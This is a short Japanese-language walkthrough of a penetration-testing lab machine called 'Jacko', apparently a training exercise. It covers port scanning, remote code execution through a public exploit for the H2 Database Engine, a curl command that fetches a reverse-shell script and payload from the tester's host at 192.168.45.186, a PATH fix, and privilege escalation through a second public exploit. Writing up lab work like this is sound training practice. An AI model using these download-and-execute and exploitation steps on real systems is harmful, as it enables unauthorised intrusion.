# Jacko
## Time
foothold = 35min
getshell = 40min
privesc =  ∞


## 教訓
- Windows特有のシェル取りの難しさがあった。
- Windowsのときはmeterpreter runさせるのがよさそう。安定する。
- PATHが通ってないとかがあるので、setしたりして環境変数設定するのも大事。


## 手順
1. rustscanすると、8082と80ポートが怪しい。
2. feroxbusterすると8082ポートの方で、H2 Database EngineというJava系アプリが動いてる。[このエクスプロイト](https://www.exploit-db.com/exploits/49384)を使う。その際、login自体はパスワードなしでいける。
3. エクスプロイトを使うとjacko\tonyが表示され、whoamiがうまくいってることが分かる。
4. tcpdumpとpython3 -m http.server 80でチェックしながらRCEで動作するコマンドを探る。curl 192.168.45.186:80/rev.ps1 -o ./rev.ps1が動いた。cmd /c dirも動く。
5. 実行しているディレクトリはC:\Program Files (x86)\H2\serviceということが分かる。cmd /c cdのコマンドを実行するとわかる
6. tcpdumpするとcurlで取得はできてるっぽいけど、どうもフォルダへの書き込みができていないっぽい？なのでcurlの-oでファイルの書き込み先を../../../Users/Public/hoge.exeみたいにする。そうすると、C:\Users\Public\hoge.exeにファイルを吐き出すことになり、そのフォルダ指定してhoge.exeを実行するとシェルが取れる。
7. ただ、whoamiやcmd.exeといった一般的なコマンドがnot foundとなってまともに実行できない。これは環境変数が適切なデフォルト値になっていないためと考えられるため、環境変数を設定する。以下のコマンドで、powershellのコマンドをシェルに指定できる。  
```
set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
```
8. Program Filesx86フォルダの下に、[このソフト](https://www.exploit-db.com/exploits/49382)がある。このソフトのパブリックエクスプロイトを使って権限昇格して終わり。
9. この時、winpeasやprivesccheckの結果が結構ヒットする。dllハイジャックやSeImpersonateなど。SeImpersonateはgodpotatoで機能するらしいが自分の環境では再現できず。他にもいくつか別の方法してる人はいたが、このPagerのパブリックエクスプロイトからいくのが意図したパスっぽい？